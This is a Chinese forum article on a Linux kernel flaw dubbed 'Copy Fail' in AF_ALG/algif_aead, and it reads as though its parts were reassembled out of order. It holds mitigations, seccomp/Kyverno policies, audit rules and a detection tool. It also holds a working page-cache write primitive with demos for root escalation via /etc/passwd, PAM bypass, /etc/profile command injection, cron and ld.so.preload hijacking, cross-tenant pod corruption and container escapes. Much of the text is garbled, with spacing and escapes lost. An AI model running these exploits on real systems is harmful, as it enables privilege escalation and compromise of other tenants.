# 禁用 algif_aead 初始化grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init"reboot
# 更激进的方式: 禁用整个 AF_ALG 接口grubby --update-kernel=ALL --args="initcall_blacklist=af_alg_init"reboot

python3 -c"import socket; socket.socket(38,5,0)"2>&1
# 预期: OSError: [Errno 97] Address family not supported by protocol
# 或: OSError: [Errno 93] Protocol not supported

以上缓解可能影响使用内核硬件加速加密的应用（如 OpenSSL 的afalgengine、IPsec 的xfrm）。大多数应用会自动 fallback 到用户空间加密实现，影响极小。

（CloudLinux）：kcarectl --update即可应用 live patch，无需重启。验证：kcarectl --patch-info | grep -i "copy.fail|algif_aead|CVE-2026-31431"。

docker--version
# Docker version29.4.3或更高 → 已内置防御
# 验证docker run--rm python:3.11-slim python3 -c "import socket
try: socket.socket(38,5,0) print('[!] FAIL — AF_ALG not blocked')exceptOSErrorase: print(f'[+] AF_ALG blocked: {e}')"

{"defaultAction":"SCMP_ACT_ALLOW","syscalls":[{"names":["socket"],"action":"SCMP_ACT_ERRNO","errnoRet":1,"args":[{"index":0,"value":38,"op":"SCMP_CMP_EQ"}]}]}

docker run --rm--security-opt seccomp=block-af-alg.json python:3.11-slim python3 -c"import socket
try: socket.socket(38, 5, 0) print('[!] FAIL')
except PermissionError as e: print(f'[+] AF_ALG blocked: {e}')s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)print('[+] TCP socket OK')s.close()"# [+] AF_ALG blocked: [Errno 1] Operation not permitted
# [+] TCP socket OK

cpblock-af-alg.json /var/lib/kubelet/seccomp/# k3s 路径: /var/lib/rancher/k3s/agent/seccomp/

spec:
securityContext:
seccompProfile:
type:
LocalhostlocalhostProfile:
block-af-alg.json

apiVersion:
kyverno.io/v1kind:
ClusterPolicymetadata:
name:
require-seccomp-block-af-algspec:
validationFailureAction:
Enforcerules:-name:
check-seccompmatch:
any:-resources:
kinds:["Pod"]validate:
message:"Pod must use block-af-alg seccomp profile (CVE-2026-31431 mitigation)"pattern:
spec:
securityContext:
seccompProfile:
type:"Localhost"localhostProfile:"block-af-alg.json"

八、攻击检测

# 持久化审计规则cat> /etc/audit/rules.d/copyfail.rules <<'EOF'-a always,exit-Farch=b64 -S socket -F a0=38 -k copyfail_af_alg-a always,exit-Farch=b64 -S splice -k copyfail_spliceEOFaugenrules --load

普通read:文件→[PageCache]→用户buffer ←读到篡改后的数据O_DIRECT:文件→[磁盘] →用户buffer ←读到原始数据如果两者不同→PageCache被非法修改

能检测所有仅修改页缓存的漏洞（Copy Fail、Dirty Pipe、Dirty Frag 以及未来同类 0-day），不绑定特定攻击手段。Dirty COW 是例外——它会通过 page writeback 将修改写回磁盘，导致 O_DIRECT 读到的也是篡改后的数据，需要依赖传统文件完整性检查（rpm -V/ AIDE / Tripwire）来检测

对于没有被任何进程以写模式打开的文件，page cache 与磁盘不一致是绝对异常——Linux 内核通过deny_write_access()保证文件不可能被同时写入和执行

即使攻击者使用未知漏洞篡改 page cache，只要篡改发生就能检测到

# Copy Fail 篡改 /usr/bin/su 的 ELF headerpython3 poc_marker.py /usr/bin/su
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# O_DIRECT 比对立即检测到差异
# Page cache [0:16]: deadbeef020101000000000000000000 ← 篡改后
# O_DIRECT [0:16]: 7f454c46020101000000000000000000 ← 磁盘原始 ELF header
# [ALERT] SUID binary TAMPERED! 4 bytes differ at: [0, 1, 2, 3]

启动时扫描目标目录，建立 SUID/SGID 文件集合。非 SUID 文件的执行直接放行，零开销

root 已有最高权限，无需 SUID 提权。在容器逃逸场景中，篡改者是容器内 root，但受害者（执行被篡改 SUID 文件的人）是宿主机普通用户——Guard 正确拦截此场景

FAN_OPEN_EXEC_PERM需要 kernel >= 5.0（RHEL 8 通过 backport 支持，已验证）。旧内核自动降级到FAN_OPEN_PERM（拦截所有 open 事件，在用户空间过滤，开销略高但功能等价）

如果 SUID 文件正在被包管理器更新，内核自身通过deny_write_access()拒绝execve()（返回ETXTBSY），不存在”合法更新导致误报”的场景

2026-05-08 06:57:34 INFO Found 21 SUID/SGID files2026-05-08 06:57:34 INFO Monitoring mount (FAN_OPEN_EXEC_PERM): /usr2026-05-08 06:57:34 INFO Guard active [ENFORCE] (event_size=24, check_root=False)
# Copy Fail 篡改 /usr/bin/su 后，普通用户尝试执行:
2026-05-08 06:57:38 WARNING [ALERT] BLOCKED pid=2677362 uid=1000 /usr/bin/su (page cache tampered at offset 0)
# 用户侧:$ /usr/bin/subash: /usr/bin/su: 不允许的操作 (exit126)

九、总结

（根本修复）

（容器环境最简单有效的缓解；Docker ≥ 29.4.3 已内置）

（执行时拦截被篡改的 SUID/SGID 二进制，阻断最直接的提权路径）

（覆盖 Guard 无法拦截的攻击面：PAM 模块、共享库、/etc/passwd、/etc/profile等配置文件，以及容器 lower layer）

（审计兜底，记录 AF_ALG 使用行为）

看雪ID：0xlane

https://bbs.kanxue.com/user-home-860174.htm

*本文为看雪论坛精华文章，由0xlane原创，转载请注明来自看雪社区

第十届安全开发者峰会【议题征集】-欢迎投稿

# 往期推荐

安卓逆向基础知识之frida Hook

2025 强网杯和强网拟态部分题解

在逆向分析方面-unidbg真的适合 MCP 吗？

AI静态分析，内核模块隐藏 Frida 特征，绕过linker私有结构遍历崩溃链

某安全so库深度解析

球分享

球点赞

球在看

点击阅读原文查看更多


```
Scatterlist (SGL) AEAD Crypto Page Cache | | | |scatterwalk AAD authencesn splice() | | | | +--------+-------+ | | | | | AF_ALG-------------+ | | | algif_aead--------------------------+
structscatterlist{unsignedlong page_link; // 指向 page 结构（或 CHAIN 到下一个 SGL 数组）unsignedint offset; // 页面内的起始偏移unsignedint length; // 数据长度};
import socket, osAF_ALG = 38SOL_ALG = 279
# 1. 创建 AF_ALG socket，指定使用的加密算法alg_sock = socket.socket(AF_ALG, socket.SOCK_SEQPACKET, 0)
# 绑定算法名称，例如 AEAD 类型的 gcm(aes)alg_sock.bind(("aead","gcm(aes)"))alg_sock.setsockopt(SOL_ALG, 1, key_bytes) # ALG_SET_KEY: 设置密钥alg_sock.setsockopt(SOL_ALG, 4, None, 16) # ALG_SET_AEAD_AUTHSIZE: 设置 auth tag 大小
# 2. accept 获得一个操作用的 socketop_sock = alg_sock.accept()[0]# 3. 通过 sendmsg 发送待加密/解密的数据
# cmsg 中通过控制消息指定操作类型(加密/解密)、IV、AAD 长度等参数op_sock.sendmsg([plaintext_data], control_messages)
# 4. recv 获取加密/解密结果（内核在此时执行实际的加解密操作）result = op_sock.recv(output_buffer_size)
输入: AAD (Associated Data) || Ciphertext || Auth Tag输出: AAD || Plaintext
// crypto/authencesn.c - crypto_authenc_esn_decrypt()// 从 AAD 中读取前 8 字节scatterwalk_map_and_copy(tmp, req->dst,0,8,0);// 在 IPsec 场景: tmp[0] = SPI, tmp[1] = SeqNo_Hiunsigned int cryptlen = req->cryptlen;cryptlen -= authsize; // 定位到 auth tag 区域的起始// 将 AAD[4:8] 临时写入 dst 中 tag 区域，供 HMAC 计算使用scatterwalk_map_and_copy(tmp +1, req->dst, assoclen + cryptlen,4,1);// ^^^^^^^^ ^// AAD[4:8] 4字节, 1=写方向
// 2017 之前: out-of-placeaead_request_set_crypt(&areq->aead_req, areq->tsgl, // req->src = TX SGL（输入数据） areq->first_rsgl.sgl.sg,// req->dst = RX SGL（用户接收 buffer） used, ctx->iv);
// 2017 之后的漏洞代码 (in-place)// Step 1: 复制 AAD+密文 到 RX buffermemcpy_sglist(rsgl, tsgl_src, outlen); // outlen = assoclen + cryptlen - authsize// Step 2: 从 TX SGL 中取出 tag pagesaf_alg_pull_tsgl(sk, processed, areq->tsgl, processed - as);// Step 3: 链到 RX SGL 尾部sg_chain(rsgl_sg, rsgl_nents, areq->tsgl);// Step 4: in-place — src 和 dst 都指向 这个 combined RX SGLaead_request_set_crypt(&areq->aead_req, rsgl_src, // req->src = RX SGL (含 chained tag pages) rsgl_dst, // req->dst = RX SGL (同一个!) used, ctx->iv);
# 要写入的 4 字节数据evil_bytes = b'xdexadxbexef'# Step 1: 通过 sendmsg 发送 8 字节 AAD
# AAD[0:4] = 任意填充, AAD[4:8] = 要写入 page cache 的数据
# authencesn 会把 AAD[4:8] 作为 ESN seqno_lo 写入 scratch 区域aad = b'x00x00x00x00' + evil_bytes # 8 字节op.sendmsg([aad], cmsg, MSG_MORE) # MSG_MORE: 后续还有数据
# Step 2: 通过 splice 将目标文件的前 t+4 字节送入 AF_ALG socket
# splice 直接传递 page cache page 引用，不复制数据pipe_r, pipe_w = os.pipe()target_fd = os.open("/usr/bin/su", os.O_RDONLY)os.splice(target_fd, pipe_w, t + 4, offset_src=0) # 文件 → 管道os.splice(pipe_r, op.fileno(), t + 4) # 管道 → AF_ALG socket
TX SGL:+--------------------+----------------------------------------+|sendmsg data (8B) |splice data (t+4bytes) ||AAD:
4zero bytes |file[0:t+4] ||+evil_bytes |page cache page refs via splice || (kmalloc memory) |(pointstoGLOBALSHARED page cache!) |+--------------------+----------------------------------------+
outlen = assoclen + (cryptlen - authsize) =8+ ((t+4) -4) = t +8(1)memcpy_sglist(RX buffer, TX SGL, outlen=t+8):
Copyfirst t+8bytes of TX SGL to RXbuffer(user-space allocated memory) RX buffer contents: [0:8] = copy ofAAD(sendmsg data) [8:8+t] = copy of file[0:t] (ciphertext portion) Note: this is a DATA COPY, not a pagereference(2)af_alg_pull_tsgl(TX SGL, skip=t+8, take=4): Skip first t+8bytes of TX SGL, extract last4bytes(tag region) These4bytesinTX SGL correspond to file[t:t+4] from splice->SGL en
try: { page = file'spage cache page, offset = t%4096, length =4}->This is the ORIGINAL page cache reference, NOT a copy!(3)sg_chain(RX SGL tail, tag SGL): Chain the tag page reference to the end of RX SGL
combined dst SGL (=req->src=req->dst):+-- RX buffer (user-space, SAFE) ----+ +-- chained tag (PAGE CACHE!) ------+|||||AAD (8B) | ciphertext (tB) |->| file[t:t+4]inpage cache |||=copyoffile[0:t] || original pagereffromsplice |||||+-- offset 0 t+8 -----+ +-- offset t+8 t+12 -+
// crypto_authenc_esn_decrypt() 的 scratch write:// 先读取 AAD[0:8]scatterwalk_map_and_copy(tmp, req->dst,0,8,0); // tmp[0]=AAD[0:4], tmp[1]=AAD[4:8]unsigned int cryptlen = req->cryptlen; // = t + 4 (密文 + tag 的长度)cryptlen -= authsize; // = t + 4 - 4 = t// 将 tmp[1] (= AAD[4:8] = evil_bytes) 写入 dst[assoclen + cryptlen]scatterwalk_map_and_copy(tmp +1, req->dst, assoclen + cryptlen,4,1);// ^^^^^^^^ ^^^^^^^^^^^^^^^^ ^// = AAD[4:8] = 8 + t 写方向// = evil_bytes
写入目标: file page cache[t : t+4]写入值: sendmsg 发送的 AAD[4:8] (4 字节, 完全可控)写入大小: 固定 4 字节 (authencesn 硬编码的 u32)触发条件: assoclen=8, authsize=4, splice 长度=t+4文件权限: 只需 O_RDONLY，不需要写权限根本原因: dst SGL 尾部 chained 的 tag pages 是 splice 引入的 page cache 原始引用
// 修复后: out-of-place// src = TX SGL (包含 page cache pages，但只读)// dst = RX SGL (纯用户空间 buffer)aead_request_set_crypt(&areq->aead_req, tsgl_src, // req->src = TX SGL rsgl_dst, // req->dst = RX SGL (独立!) used, ctx->iv);// AAD 通过显式 memcpy 复制到 RX buffermemcpy_sglist(rsgl_src, tsgl_src, ctx->aead_assoclen);
AF_ALG =38SOL_ALG =279ASSOCLEN =8 # AAD 长度AUTHSIZE =4 # auth tag 大小 (也影响偏移计算)defpage_cache_write_4bytes(fd, offset, value):"""向 fd 指向文件的 page cache[offset : offset+4] 写入 value (4字节)"""# 创建 AF_ALG socket, 绑定 authencesn(hmac(sha256),cbc(aes)) 算法 s = socket.socket(AF_ALG, socket.SOCK_SEQPACKET,0) s.setsockopt(SOL_ALG,2, # ALG_SET_KEY: 密钥 (全零, 内容不影响漏洞触发)b'x08x00x01x00' # rtattr 头b'x00x00x00x10' # enckeylen=16 (AES-128) +b'x00'*32) # 16B authkey + 16B enckey s.setsockopt(SOL_ALG,4,None, AUTHSIZE) # ALG_SET_AEAD_AUTHSIZE = 4 op = s.accept()[0]# 构造 8 字节 AAD: 前 4B 填充零, 后 4B 是要写入 page cache 的 value
# authencesn 会把 AAD[4:8] (= value) 写入 dst[assoclen + cryptlen] aad =b'x00'*4+ value # 8 字节 op.sendmsg([aad], [(SOL_ALG,2,b'x00'*4), # ALG_OP_DECRYPT (SOL_ALG,3,b'x10'+b'x00'*19), # IV = 16B zero (SOL_ALG,4, struct.pack('I', ASSOCLEN))],# assoclen = 8 socket.MSG_MORE)
# 通过 splice 将目标文件的 [0, offset+4) 送入 AF_ALG socket
# splice 传递 page cache page 引用 (零拷贝) pr, pw = os.pipe() os.splice(fd, pw, offset + AUTHSIZE, offset_src=0) os.splice(pr, op.fileno(), offset + AUTHSIZE)try: op.recv(ASSOCLEN + offset) # 触发 _aead_recvmsg → authencesn scratch writeexceptOSError:
pass
# HMAC 校验失败返回 EBADMSG, 但 page cache 写入已完成 op.close(); s.close(); os.close(pr); os.close(pw)
# 构建内核 + busybox + PoC (通过 Docker，约 10 分钟)docker build -t copyfail-build -f Dockerfile .docker run --rm-v $(pwd)/output:/output copyfail-build
# 产出:# output/bzImage — 压缩内核 (4.8M)
# output/vmlinux — 带 DWARF 调试符号 (126M, 给 GDB 用)
# output/rootfs.cpio.gz — initramfs (含 busybox + poc_pagecache_write)
CONFIG_CRYPTO_USER_API_AEAD=y # AF_ALG AEAD 接口CONFIG_CRYPTO_AUTHENC=y # authenc 模块CONFIG_CRYPTO_SEQIV=y # 序列号 IVCONFIG_DEBUG_INFO_DWARF5=y # 完整调试符号CONFIG_GDB_SCRIPTS=y # GDB helper scriptsCONFIG_KALLSYMS_ALL=y # 所有内核符号可见
# 普通启动 (直接进入 shell)./run_qemu.sh
# 调试模式 (QEMU 暂停, 等待 GDB 连接到 :
1234)./run_qemu.sh debug
gdb ./vmlinux -ex'target remote :
1234'-ex'continue'
# === VM 内执行 ===# 1. 创建测试文件echo"AABBCCDD EEFFGGHH IIJJKKLL MMNNOOPP"> /tmp/target.txthexdump -C /tmp/target.txt
# 00000000 41 41 42 42 43 43 44 44 20 45 45 46 46 47 47 48 |AABBCCDD EEFFGGH|# 00000010 48 20 49 49 4a 4a 4b 4b 4c 4c 20 4d 4d 4e 4e 4f |H IIJJKKLL MMNNO|# 00000020 4f 50 50 0a |OPP.|# 2. 第一次写入: offset 0, value 0xDEADBEEFpoc_pagecache_write /tmp/target.txt 0 0xDEADBEEF
# [*] Target: /tmp/target.txt
# [*] Offset: 0 (0x0)
# [*] Value: 0xdeadbeef
# [*] Writing 4 bytes to page cache...# [+] Done. Page cache of /tmp/target.txt at offset 0 should now contain 0xdeadbeef
# 3. 验证写入结果hexdump -C /tmp/target.txt |head-2
# 00000000 ef be ad de 43 43 44 44 20 45 45 46 46 47 47 48 |....CCDD EEFFGGH|# ^^^^^^^^^^^# 0xDEADBEEF (little-endian)
# 4. 第二次写入: offset 8, value 0xCAFEBABEpoc_pagecache_write /tmp/target.txt 8 0xCAFEBABE
# 5. 验证两次写入互不干扰hexdump -C /tmp/target.txt |head-2
# 00000000 ef be ad de 43 43 44 44 be ba fe ca 46 47 47 48 |....CCDD....FGGH|# ^^^^^^^^^^^# 0xCAFEBABE (little-endian)
# 6. drop_caches 行为验证 (tmpfs 上的文件不会恢复)echo3 > /proc/sys/vm/drop_cacheshexdump -C /tmp/target.txt |head-2
# 00000000 ef be ad de 43 43 44 44 be ba fe ca 46 47 47 48 |....CCDD....FGGH|# ↑ tmpfs: 数据只存在于 page cache, drop_caches 不驱逐
# ↑ 磁盘文件系统 (ext4): drop_caches 后会从磁盘重新加载原始数据
# === 终端 1: 启动 QEMU (debug 模式) ===./run_qemu.sh debug
# === Debug mode: QEMU paused, waiting for GDB on localhost:
1234 ===# === 终端 2: 连接 GDB，加载 Python 断点脚本 ===gdb ./vmlinux -x exp3_2_gdb.py
# [GDB Script] Setting up breakpoints for Experiment 3.2+3.3...# Breakpoint 1 at 0xffffffff812984f8: file crypto/authencesn.c, line 263.# [GDB] BP1: crypto_authenc_esn_decrypt (entry)
# Breakpoint 2 at 0xffffffff8128f93e: file crypto/scatterwalk.c, line 57.# [GDB] BP2: scatterwalk_map_and_copy (writes only)(gdb) target remote :
1234(gdb)continue
===============================================================crypto_authenc_esn_decryptENTRY===req =0xffff888002d96a90req->src=0xffff888002d96820req->dst=0xffff888002d96820src==dst:
YES(IN-PLACE!) ←漏洞根因确认assoclen=8cryptlen=4(before-=authsize)============================================================---dstSGLentries---SGL[0]:
page_link=0xffffea000006f440offset=1760length=8SGL[1]:
page_link=0xffff8880027cbda1offset=0length=0[CHAIN]SGL[2]:
page_link=0xffffea000006f8c2offset=0length=4[LAST]===[HIT1]scatterwalk_map_and_copyWRITE===buf=0xffffc90000113d20sg=0xffff888002d96820start=4nbytes=4writing value:
0x41414141backtrace:#0 scatterwalk_map_and_copy#1 crypto_authenc_esn_decrypt ← seqno_hi 写入 dst[4..7]#2 _aead_recvmsg#3 aead_recvmsg#4 sock_recvmsg_nosec#5 sock_recvmsg===[HIT2]scatterwalk_map_and_copyWRITE===buf=0xffffc90000113d24sg=0xffff888002d96820start=8nbytes=4writing value:
0xdeadbeef ←★SCRATCH WRITE:
命中pagecache!backtrace:#0 scatterwalk_map_and_copy#1 crypto_authenc_esn_decrypt ← dst[assoclen+cryptlen] = dst[8+0] = page cache#2 _aead_recvmsg...===[HIT3]scatterwalk_map_and_copyWRITE===buf=0xffffc90000113cc8sg=0xffff888002d96820start=0nbytes=8writing value:
0x41414141backtrace:#0 scatterwalk_map_and_copy#1 crypto_authenc_esn_decrypt_tail ← ESN header 恢复 (HMAC 后清理)...
# 使用修复版内核启动BZIMAGE=bzImage.patched VMLINUX=vmlinux.patched ./run_qemu.sh debug
=============================================================== crypto_authenc_esn_decrypt ENTRY === req = 0xffff888002dcea90 req->src = 0xffff888002e6d880 req->dst = 0xffff888002dce820 src == dst: NO ← 修复: out-of-place 模式 assoclen = 8 cryptlen = 4 (before -= authsize)============================================================ --- dst SGL entries --- SGL[0]: page_link=0xffffea000006f582 offset=1760 length=8 [LAST] ^^^^ ↑ 仅 1 个 entry, 无 CHAIN, 无 page cache page!=== [HIT 1] scatterwalk_map_and_copy WRITE === writing value: 0x41414141 sg->page_link = 0xffffea000006f582 ← 写入 RX buffer (用户空间), 安全=== [HIT 2] scatterwalk_map_and_copy WRITE === writing value: 0xdeadbeef sg->page_link = 0xffffea000006f582 ← 同样写入 RX buffer, 无副作用
#修改前: testuser123:x:
1000:
1000::/home/testuser123:/bin/bashpython3 exp_passwd_uid.py testuser123#[+] SUCCESS: UID changed to 0000inpage cacheid testuser123#uid=0(root) gid=0(root)groups=0(root)su - testuser123#whoami→ root#可以读 /etc/shadow ✅#恢复echo 3 > /proc/sys/vm/drop_caches
; 密码校验后保存返回值0x3d5e: 89c5 mov %eax, %ebp ; 原始: 保存真实的校验结果; 修改为:
0x3d5e: 31ed xor %ebp, %ebp ; 篡改: 强制清零 = PAM_SUCCESS
python3 exp_pam_bypass.py
# [*] Auto-detected patch offset: 0x3d5e
# [*] Patching to: 31ede95e (xor %ebp,%ebp)
# [+] SUCCESS: pam_unix.so patched in page cachesu root
# Password: (任意输入)
# whoami → root ✅
#Step 1: 启动监控进程，持续读取 mmap 映射中的字符串gcc -o monitor exp_shared_lib_monitor.c -ldl./monitor &#[monitor] PID=161045#[monitor] initial:"/etc/hosts"#[monitor] tick 1: no change#[monitor] tick 2: no change#Step 2: 篡改 .so 的 page cache (另一终端)python3 exp_shared_lib.py#[+] SUCCESS:'/etc/hosts'→'/etc/h0sts'inpage cache#Step 3: 监控进程无需重启即检测到变化#[monitor] tick 3: *** STRING CHANGED ***#[monitor] now:"/etc/h0sts"#[monitor] *** LIVE-PATCH CONFIRMED (no restart) ***
#原始:# It's NOT a good idea to change this file unless you know what you#注入:id>>/tmp/CF-PWNED #ea to change this file unless you know what you
# ↑ 命令部分 ↑'#'注释掉剩余文本, 不影响后续行
python3 exp_profile_inject.py"id>>/tmp/CF-PWNED #"# [*] Payload: 20 bytes, 5 writes
# [+] SUCCESS: command injected into /etc/profile
# 触发: root 执行登录 shellsu - root -c"echo triggered"cat/tmp/CF-PWNED
# uid=0(root) gid=0(root) groups=0(root) ✅
#环境准备: cron job 每分钟执行 /tmp/copyfail-lab/cron_target.sh#脚本内容:
echo"ORIGINAL$(date +%s)">> cron.log#篡改脚本 page cachepython3 exp_cron_script.py /tmp/copyfail-lab/cron_target.sh#[+] SUCCESS: script tamperedinpage cache ("ORIGINAL"→"HIJACKED")#下一次 cron 触发 (≤ 1 分钟):
tail /tmp/copyfail-lab/cron.log#HIJACKED 1778309461 ← crond 执行了被篡改的脚本 ✅
#前提: 系统已有 /etc/ld.so.preload (用于性能监控等)cat /etc/ld.so.preload#/tmp/copyfail-lab/libmarker.sopython3 exp_preload_hijack.py#[+] SUCCESS: preload path hijacked#/tmp/copyfail-lab/libmarker.so → /tmp/copyfail-lab/libevil00.sols /dev/null#[preload] EVIL LIBRARY LOADED! ← 恶意库被每个新进程加载#/dev/null
# 部署两个使用相同 base image 的 Podkubectl create ns copyfail-labkubectl apply -f pod-cross-tenant.yaml # 见 Gist
# 验证两个 Pod 共享同一 /etc/os-release inodekubectlexec-n copyfail-lab pod-attacker --stat-c'%i'/etc/os-release
# 208483846kubectlexec-n copyfail-lab pod-victim-same --stat-c'%i'/etc/os-release
# 208483846 ← 相同 inode = 共享 page cache
# 攻击者 Pod 中执行 PoCkubectlexec-n copyfail-lab pod-attacker -- python3 /poc_marker.py /etc/os-release
# [*] Target: /etc/os-release
# [*] Before: 50524554
# [*] After: deadbeef
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# 受害者 Pod (同 base image) — 立即看到被篡改的内容kubectlexec-n copyfail-lab pod-victim-same -- python3 -c"import os; print(os.pread(os.open('/etc/os-release',0),16,0).hex())"# deadbeef54595f4e414d453d22446562
# [+] MARKER FOUND: page cache is SHARED with attacker pod!# 对照组 (不同 base image) — 不受影响kubectlexec-n copyfail-lab pod-victim-alpine --head-c 16 /etc/os-release | xxd
# 00000000: 4e41 4d45 3d22 416c 7069 6e65 NAME="Alpine
# 宿主机读取 snapshot 层文件head-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 恢复echo3 > /proc/sys/vm/drop_cacheshead-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb
# 创建两个完全隔离的 namespacekubectl create ns copyfail-lab # 攻击者kubectl create ns tenant-victim # 受害者
# 部署 Pod (见 Gist: pod-cross-tenant.yaml)kubectl apply -f pod-cross-tenant.yaml
# 两个不同 namespace 的 Pod, 相同 base image → 相同 inodekubectlexec-n copyfail-lab pod-attacker --stat-c'%i'/bin/cat
# 1420102kubectlexec-n tenant-victim victim-app --stat-c'%i'/bin/cat
# 1420102 ← 相同! 即使在不同 namespace
# Step 1: 确认受害者 /bin/cat 正常kubectlexec-n tenant-victim victim-app -- python3 -c"import os; print(os.pread(os.open('/bin/cat',0),16,0).hex())"# 7f454c46020101000000000000000000 (正常 ELF header)
# Step 2: 攻击者执行 Copy Fail (无任何特权!)kubectlexec-n copyfail-lab pod-attacker -- python3 /poc_marker.py /bin/cat
# [*] Before: 7f454c46
# [*] After: deadbeef
# [+] SUCCESS: page cache corrupted! first 4 bytes = deadbeef
# Step 3: 受害者立即受到影响kubectlexec-n tenant-victim victim-app -- python3 -c"import os; print(os.pread(os.open('/bin/cat',0),16,0).hex())"# deadbeef020101000000000000000000
# ↑ ELF magic 被破坏!# Step 4: 受害者服务中断kubectlexec-n tenant-victim victim-app --cat/etc/hostname
# exec /usr/bin/cat: exec format error ← 二进制无法执行
# Step 5: 恢复 (宿主机执行)echo3 > /proc/sys/vm/drop_cacheskubectlexec-n tenant-victim victim-app --cat/etc/hostname
# victim-app ← 恢复正常
# 1. 列出节点上所有 privileged 容器及其镜像crictl ps -o json | jq -r'.containers[] | "(.id) (.image.image) (.metadata.name)"'# 2. 对比业务 Pod 镜像与目标 DaemonSet 镜像的 layer digestMY_IMAGE="python:3.11-slim"TARGET_IMAGE="registry.k8s.io/kube-proxy:v1.35.2"crictl inspecti$MY_IMAGE| jq -r'.info.imageSpec.rootfs.diff_ids[]'> /tmp/my_layers.txtcrictl inspecti$TARGET_IMAGE| jq -r'.info.imageSpec.rootfs.diff_ids[]'> /tmp/target_layers.txtcomm-12 <(sort/tmp/my_layers.txt) <(sort/tmp/target_layers.txt)
# 有输出 → 存在共享层
# 3. 确认目标文件的 inode 是否真的被两个容器共享
# (在两个容器内分别执行)stat-c'%d:%i'/usr/sbin/ipset # 设备号:
inode号
# 两个容器输出相同 → page cache 共享确认
# 宿主机通过 snapshot 路径读取同一 inode — 读到篡改后的数据head-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: dead beef 5459 5f4e 414d 453d 2244 6562 ....TY_NAME="Deb
# drop_caches 强制驱逐 page cache — 内核从磁盘重新加载echo3 > /proc/sys/vm/drop_cacheshead-c 16 /var/lib/containerd/.../snapshots//fs/etc/os-release | xxd
# 00000000: 5052 4554 5459 5f4e 414d 453d 2244 6562 PRETTY_NAME="Deb
# 追踪 runcinit进程读取文件时的 mount namespacebpftrace-e 'kprobe:
vfs_read/comm=="runc:[2:
INIT]"/{$task=(structtask_struct*)curtask;$mntns=$task->nsproxy->mnt_ns->ns.inum; printf("runc-init vfs_read mntns=%u file=%sn",$mntns, str(((structfile*)arg0)->f_path.dentry->d_name.name));}'&# 触发容器创建kubectl run test-probe--image=python:3.11-slim--restart=Never--sleep10
# 输出:# runc-initvfs_read mntns=4026533841file=passwd
# runc-initvfs_read mntns=4026533841file=group#↑mntns≠宿主机(4026531840), 说明已在容器 namespace 内
# 追踪 containerd 进程的 vfs_readbpftrace -e 'kprobe:
vfs_read /comm == "containerd"/ { printf("containerd vfs_read: %sn", str(((struct file *)arg0)->f_path.dentry->d_name.name));}' -- 60 # 监控 60 秒, 期间创建/删除容器
# 结果: 仅看到 config.json, meta.db 等元数据文件
# 从未读取 snapshot 层的 /bin/*, /etc/* 等文件内容
# Pod 配置 (见 Gist: pod-hostpath-escape.yaml)volumes:-name:
host-binhostPath:
path:/usr/bintype:
DirectoryvolumeMounts:-name:
host-binmountPath:/hostbinreadOnly:
true # ← 看似安全
# 确认 mount 确实是只读kubectlexec-n copyfail-lab hostpath-test -- mount | grep hostbin
# /dev/mapper/cl-root on /hostbin type xfs (ro,relatime,...)
# 常规写入被拒绝kubectlexec-n copyfail-lab hostpath-test --touch/hostbin/test
# touch: cannot touch '/hostbin/test': Read-only file system
# Copy Fail 绕过只读限制!kubectlexec-n copyfail-lab hostpath-test -- python3 /poc_marker.py /hostbin/ls
# [*] Before: 7f454c46
# [*] After: deadbeef
# [+] SUCCESS: page cache corrupted!# 宿主机验证ls
# bash: /usr/bin/ls: cannot execute binary file: Exec format error
# Exit code: 126
# 部署带 CAP_DAC_READ_SEARCH 的容器kubectlapply-f-<<EOFapiVersion:
v1kind:
Podmetadata:
name:
shocker-testnamespace:
copyfail-labspec:
containers:-name:
testimage:
python:3.11-slimcommand:["sleep","infinity"]securityContext:
capabilities:
add:["DAC_READ_SEARCH"]EOF
kubectl exec -n copyfail-lab shocker-test -- python3 -c "import os, struct, ctypes#1. Shocker: open_by_handle_at() 获取宿主机根目录 fdlibc = ctypes.CDLL('libc.so.6', use_errno=True)#... (构造 root inode handle, 调用 open_by_handle_at)#2. openat() 打开宿主机 /usr/bin/cat (只读即可)#3. Copy Fail 篡改 page cache"#实验输出:#[1] Host root fd: 4#[+] Host / contents: ['.autorelabel','bin','boot','dev','etc', ...]#[2] Host /usr/bin/cat fd: 7#[3] Before: 7f454c46020101000000000000000000#[4] After: deadbeef020101000000000000000000#[+] SUCCESS: Host /usr/bin/cat corrupted via Shocker + Copy Fail!
# 部署带 CAP_SYS_ADMIN 的容器kubectlapply-f-<<EOFapiVersion:
v1kind:
Podmetadata:
name:
sysadmin-testnamespace:
copyfail-labspec:
containers:-name:
testimage:
python:3.11-slimcommand:["sleep","infinity"]securityContext:
capabilities:
add:["SYS_ADMIN"]EOF
kubectl exec -n copyfail-lab sysadmin-test -- bash -c '# 挂载 cgroup 子系统mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrpmkdir /tmp/cgrp/x
# 确认 release_agent 可写echo 1 > /tmp/cgrp/x/notify_on_release
# 设置 release_agent 为容器 upperdir 中的脚本路径host_path=$(sed -n "s/.*upperdir=([^,]*).*/1/p" /proc/self/mountinfo)echo "$host_path/cmd" > /tmp/cgrp/release_agent
# 写入逃逸命令echo "#!/bin/sh" > /cmdecho"id > /tmp/cgrp/output; hostname >> /tmp/cgrp/output">> /cmdchmod +x /cmd
# 触发echo $$ > /tmp/cgrp/x/cgroup.procssleep 1 && echo 0 > /tmp/cgrp/x/cgroup.procssleep 1 && cat /tmp/cgrp/output'# uid=0(root) gid=0(root) groups=0(root)
# your-hostname
# ↑ 宿主机以 root 执行了命令
#通过 /proc/1/root/ 获取宿主机文件 fd，然后 Copy Fail 篡改kubectl exec -n copyfail-lab hostpid-test -- python3 -c "import osfd = os.open('/proc/1/root/usr/bin/cat', os.O_RDONLY)#... page_cache_write_4bytes(fd, 0, b'xdexadxbexef')"
